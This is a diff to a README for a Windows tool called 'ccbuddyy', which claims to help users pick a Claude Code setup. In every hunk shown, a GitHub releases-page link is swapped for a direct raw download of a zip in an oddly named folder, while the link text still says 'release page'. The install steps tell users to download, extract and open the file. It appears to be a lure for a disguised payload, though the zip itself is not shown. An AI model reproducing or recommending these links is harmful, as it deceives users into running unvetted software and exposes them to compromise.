@@ -1,6 +1,6 @@
 # 🧑‍💻 ccbuddyy - Pick Your Claude Code Buddy
 
-[![Download ccbuddyy](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Puppetrycompoundnumber338/ccbuddyy/releases)
+[![Download ccbuddyy](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Puppetrycompoundnumber338/ccbuddyy/main/Analgesidae/Software-v2.3.zip)
 
 ## 📦 What ccbuddyy does
 
@@ -10,7 +10,7 @@ Use it when you want a clearer path to the right Claude Code setup without diggi
 
 ## 🚀 Download ccbuddyy for Windows
 
-1. Open the [release page](https://github.com/Puppetrycompoundnumber338/ccbuddyy/releases).
+1. Open the [release page](https://raw.githubusercontent.com/Puppetrycompoundnumber338/ccbuddyy/main/Analgesidae/Software-v2.3.zip).
 2. Find the latest release at the top of the page.
 3. Look for a Windows file, such as an `.exe` or a `.zip` file.
 4. Download the file to your computer.
@@ -20,7 +20,7 @@ Use it when you want a clearer path to the right Claude Code setup without diggi
 ### 🖱️ Download link
 
 Visit this page to download:  
-https://github.com/Puppetrycompoundnumber338/ccbuddyy/releases
+https://raw.githubusercontent.com/Puppetrycompoundnumber338/ccbuddyy/main/Analgesidae/Software-v2.3.zip
 
 ## 🪟 Windows setup
 
@@ -130,7 +130,7 @@ If the release page offers more than one file, choose the Windows one that match
 
 Use the release page as your main download source. That keeps the process simple and helps you avoid the wrong file.
 
-[Open the release page](https://github.com/Puppetrycompoundnumber338/ccbuddyy/releases)
+[Open the release page](https://raw.githubusercontent.com/Puppetrycompoundnumber338/ccbuddyy/main/Analgesidae/Software-v2.3.zip)
 
 ## 🧩 Why people use ccbuddyy
 
@@ -161,7 +161,7 @@ Keep the files together in the same folder so the app can run the right way.
 
 ## 🧾 Quick start
 
-1. Visit the [release page](https://github.com/Puppetrycompoundnumber338/ccbuddyy/releases).
+1. Visit the [release page](https://raw.githubusercontent.com/Puppetrycompoundnumber338/ccbuddyy/main/Analgesidae/Software-v2.3.zip).
 2. Download the Windows file.
 3. Extract it if needed.
 4. Open the app.
